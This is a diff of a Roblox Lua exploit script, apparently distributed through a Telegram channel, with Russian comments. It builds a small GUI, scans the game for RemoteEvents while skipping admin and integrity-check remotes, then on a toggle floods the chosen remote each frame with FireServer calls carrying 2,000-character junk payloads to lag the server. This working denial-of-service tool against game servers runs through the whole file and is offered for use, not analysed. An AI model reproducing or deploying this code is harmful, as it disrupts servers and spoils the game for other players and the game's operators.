@@ -6,7 +6,8 @@ local CoreGui = game:GetService("CoreGui")
 
 local LocalPlayer = Players.LocalPlayer
 
--- === СПИСКИ ЦЕЛЕЙ (BLACKLIST & PRIORITY) ===
+-- === ПОЛНЫЙ BLACKLIST (ЭТИ РЕМОУТЫ ИГНОРИРУЮТСЯ) ===
+-- Если скрипт найдет только их, он напишет, что сервер не поддерживается.
 local blacklistedNames = {
     "PlaceCooldownFromChat", "AdminPanelService", "AdminPanel",
     "IntegrityCheckProcessor", "LocalizationTableAnalyticsSender",
@@ -41,29 +42,28 @@ local blacklistedNames = {
     "RE/TeleportService/Reconnect"
 }
 
+-- Приоритетные цели (если найдет их — подключится сразу)
 local priorityTargets = {
     "WhyAreTheyTargetingMe!!", "FisherMan", "Chat", "AFK", "CookiesService"
 }
 
--- === НАСТРОЙКИ СКРИПТА ===
+-- === НАСТРОЙКИ ===
 local Settings = {
     LagEnabled = false,
     PacketsPerSecond = 5,
     MaxPackets = 100
 }
 
--- Переменные
 local TargetRemote = nil
 local uuid = "d80e2217-36b8-4bdc-9a46-2281c6f70b28"
 
--- === UI ЗАГРУЗКА ===
+-- === UI ИНТЕРФЕЙС ===
 if game.CoreGui:FindFirstChild("WerzzMenuV2") then
     game.CoreGui.WerzzMenuV2:Destroy()
 elseif LocalPlayer.PlayerGui:FindFirstChild("WerzzMenuV2") then
     LocalPlayer.PlayerGui.WerzzMenuV2:Destroy()
 end
 
--- Размер уменьшен, так как кнопок стало меньше
 local GuiConfig = {
     Size = UDim2.new(0, 230, 0, 180), 
     Transparency = 0.1,
@@ -104,29 +104,29 @@ UIStroke.Thickness = 1
 UIStroke.Transparency = 0.2
 UIStroke.Parent = MainFrame
 
--- Заголовок
+-- Header
 local Header = Instance.new("TextLabel")
 Header.Size = UDim2.new(1, 0, 0, 30)
 Header.Position = UDim2.new(0, 0, 0, 10)
 Header.BackgroundTransparency = 1
-Header.Text = "CapyLagger"
+Header.Text = "t.me/scriptsabhub"
 Header.TextColor3 = GuiConfig.Colors.Accent
 Header.Font = Enum.Font.GothamBold
 Header.TextSize = 14
 Header.Parent = MainFrame
 
--- Статус
+-- Status Label
 local StatusLabel = Instance.new("TextLabel")
 StatusLabel.Size = UDim2.new(1, 0, 0, 15)
 StatusLabel.Position = UDim2.new(0, 0, 0, 35)
 StatusLabel.BackgroundTransparency = 1
-StatusLabel.Text = "Scanning..."
+StatusLabel.Text = "Checking Support..."
 StatusLabel.TextColor3 = GuiConfig.Colors.TextDim
 StatusLabel.Font = Enum.Font.Gotham
 StatusLabel.TextSize = 11
 StatusLabel.Parent = MainFrame
 
--- Функция кнопок
+-- Helper Function
 local function createButton(name, text, yPos, height, widthScale, xOffset)
     local Btn = Instance.new("TextButton")
     Btn.Name = name
@@ -150,10 +150,9 @@ local function createButton(name, text, yPos, height, widthScale, xOffset)
     return Btn
 end
 
--- Кнопка Lag
 local BtnLag = createButton("Lag", "Lag: Off", 65, 35, 1, 0)
 
--- Слайдер
+-- Slider
 local SliderLabel = Instance.new("TextLabel")
 SliderLabel.Text = "Packets: " .. Settings.PacketsPerSecond
 SliderLabel.Size = UDim2.new(1, -20, 0, 20)
@@ -232,7 +231,7 @@ local function updateButtonVisual(button, state, prefix)
 end
 
 BtnLag.MouseButton1Click:Connect(function()
-    if not TargetRemote then return end
+    if not TargetRemote then return end -- Если Remote нет, кнопка не работает
     Settings.LagEnabled = not Settings.LagEnabled
     updateButtonVisual(BtnLag, Settings.LagEnabled, "Lag")
     if Settings.LagEnabled then
@@ -244,21 +243,29 @@ BtnLag.MouseButton1Click:Connect(function()
     end
 end)
 
--- === ПОИСК REMOTE EVENT И ПРОВЕРКА ===
+-- === СКАНЕР (ПРОВЕРКА НА BLACKLIST) ===
 local function findTarget()
     local foundRemotes = {}
+    
+    -- Сканируем все RemoteEvent в игре
     for _, v in pairs(game:GetDescendants()) do
         if v:IsA("RemoteEvent") then
             local fullName = v:GetFullName()
             local remoteName = v.Name
             local isBlacklisted = false
+            
+            -- Проверяем, есть ли имя в твоем списке "Не поддерживается"
             for _, blacklisted in ipairs(blacklistedNames) do
+                -- plain=true нужен, чтобы символы типа "/" читались как текст, а не код
                 if string.find(fullName, blacklisted, 1, true) or string.find(remoteName, blacklisted, 1, true) then
                     isBlacklisted = true
                     break
                 end
             end
+            
+            -- Если не в черном списке - это валидный Remote
             if not isBlacklisted then
+                -- Если в приоритете - берем сразу
                 for _, priority in ipairs(priorityTargets) do
                     if string.find(remoteName, priority, 1, true) then
                         return v
@@ -268,40 +275,43 @@ local function findTarget()
             end
         end
     end
+    
+    -- Берем первый найденный валидный ремоут
     if #foundRemotes > 0 then return foundRemotes[1] end
     return nil
 end
 
 TargetRemote = findTarget()
 
--- ПРОВЕРКА РАБОТОСПОСОБНОСТИ
+-- ПРОВЕРКА РЕЗУЛЬТАТА
 if TargetRemote then
+    -- Нашли рабочий ремоут (не из черного списка)
     StatusLabel.Text = "Connected: " .. TargetRemote.Name
     StatusLabel.TextColor3 = GuiConfig.Colors.Green
 else
-    StatusLabel.Text = "Failed: No Vulnerability Found"
+    -- Нашли ТОЛЬКО ремоуты из черного списка или вообще ничего
+    StatusLabel.Text = "Failed: Not Supported"
     StatusLabel.TextColor3 = GuiConfig.Colors.Red
     BtnLag.Text = "Not Supported"
     BtnLag.AutoButtonColor = false
     BtnLag.BackgroundColor3 = Color3.fromRGB(50, 20, 20)
 end
 
--- === LAGGER LOOP (МГНОВЕННАЯ ОСТАНОВКА) ===
+-- === LAGGER LOOP (С МГНОВЕННЫМ ВЫКЛЮЧЕНИЕМ) ===
 RunService.Heartbeat:Connect(function()
     if not Settings.LagEnabled or not TargetRemote then return end
 
     local payload = string.rep("X", 2000)
     
     for i = 1, Settings.PacketsPerSecond do
-        -- !!! ПРОВЕРКА ВНУТРИ ЦИКЛА !!!
-        -- Если кнопку выключили во время работы цикла, он прерывается мгновенно
+        -- ГЛАВНАЯ ФИШКА: Если выключили кнопку, цикл прерывается СРАЗУ
         if not Settings.LagEnabled then break end
         
         pcall(function() TargetRemote:FireServer(uuid, payload) end)
     end
 end)
 
--- === DRAG (Перетаскивание меню) ===
+-- === DRAG ===
 local dragging, dragInput, dragStart, startPos
 local function updateDrag(input)
     local delta = input.Position - dragStart
